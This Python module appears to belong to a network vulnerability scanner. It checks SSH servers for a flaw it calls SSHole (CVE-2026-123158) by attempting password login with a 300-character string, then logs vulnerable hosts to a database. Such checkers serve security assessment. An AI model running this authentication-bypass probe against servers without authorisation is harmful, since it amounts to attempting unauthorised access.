from lib.sshscan.ssh import SSH
import paramiko

# Requirements to print
from utils.output import Output
# Requirements to ES
from utils.db import DB

class Module:
    name = 'SSHole'
    description = 'Check SSHole vulnerability (CVE-2026-123158) [authenticated]'

    def run(self, target, args, creds, timeout):
        user = creds['username'] if 'username' in creds else None

        if user == None:
            raise Exception("A username (-u) is expected !")

        Output.minor({'target': 'ssh://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] Running module...' % self.name})

        for username in user.split(','):
            check(target['hostname'], target['port'], username, timeout)


def check(hostname, port, user, timeout):

    transport = paramiko.Transport((hostname, port))
    password = "A" * 300

    try:
        transport.start_client(timeout=5)

        vulnerable = False

        for attempt in (1, 2):
            try:
                transport.auth_password(user, password, fallback=False)
                vulnerable = True
                Output.vuln(f"[+] Successful authentication after attempt: {attempt}")
                break
            except paramiko.AuthenticationException:
                if attempt == 1:
                    pass
                else:
                    raise

        if vulnerable:
            # Write in terminal
            Output.vuln({'target': 'ssh://%s:%d' % (hostname, port), 'message': '[SSHHole] Vulnerable to CVE-2026-123158 with user %s (SSHole)' % user})

            # Push in ES
            vuln_info = {
                'host': hostname,
                'port': port,
                'service': 'ssh',
                'url': 'ssh://%s:%d' % (hostname, port),
                'name': 'CVE-2026-123158 (SSHole)',
                'description': 'Server ssh://%s:%d is vulnerable to CVE-2026-123158 with user %s (SSHole)' % (hostname, port, user),
            }
            DB.insert_vulnerability(vuln_info)


    except paramiko.AuthenticationException:
        pass
    finally:
        transport.close()

